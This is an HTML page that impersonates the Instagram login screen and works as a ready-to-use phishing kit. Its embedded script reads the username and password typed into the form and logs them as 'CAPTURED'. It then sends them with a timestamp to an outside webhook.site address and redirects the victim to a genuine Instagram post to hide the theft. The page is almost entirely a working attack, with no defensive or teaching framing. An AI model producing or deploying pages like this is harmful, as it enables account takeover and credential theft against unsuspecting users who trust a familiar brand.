<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;500;600;700&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#f0f2f5; font-family:'Instagram Sans',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
        .login-box {
            background:white; padding:40px; border:1px solid #dbdbdb; border-radius:8px; max-width:360px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.1);
        }
        .logo { font-size:55px; font-weight:700; background:linear-gradient(45deg,#E1306C,#F56040,#C13584); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:25px; letter-spacing:-4px; }
        input { width:100%; padding:14px 16px; margin:8px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:6px; font-size:16px; }
        button { width:100%; padding:12px; margin:20px 0 15px; background:#0095f6; color:white; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">instagram</div>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="submitBtn">Log in</button>
        </form>

        <div style="margin:20px 0; color:#8e8e8e; font-size:14px;">OR</div>
        <button onclick="demoFB()" style="background:#1877f2;">Log in with Facebook</button>
    </div>

    <script>
        const WEBHOOK_URL = "https://webhook.site/187d1a3f-810c-4289-b764-21942457a352";
        const REDIRECT_URL = "https://www.instagram.com/p/DX6lqBNPyEQ/";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            console.log('%c🔴 CAPTURED', 'color:#E1306C; font-size:18px; font-weight:bold;');
            console.log('Username:', username);
            console.log('Password:', password);

            // Simple form POST (most reliable with webhook.site)
            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            formData.append('timestamp', new Date().toISOString());

            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            }).then(() => {
                console.log('%c✅ Sent via FormData', 'color:lime;');
            }).catch(err => {
                console.log('%c⚠️ Send failed', 'color:orange;');
            });

            // Redirect
            document.getElementById('submitBtn').textContent = 'Logging in...';
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1200);
        });

        function demoFB() { alert("Facebook demo"); }
    </script>
</body>
</html>
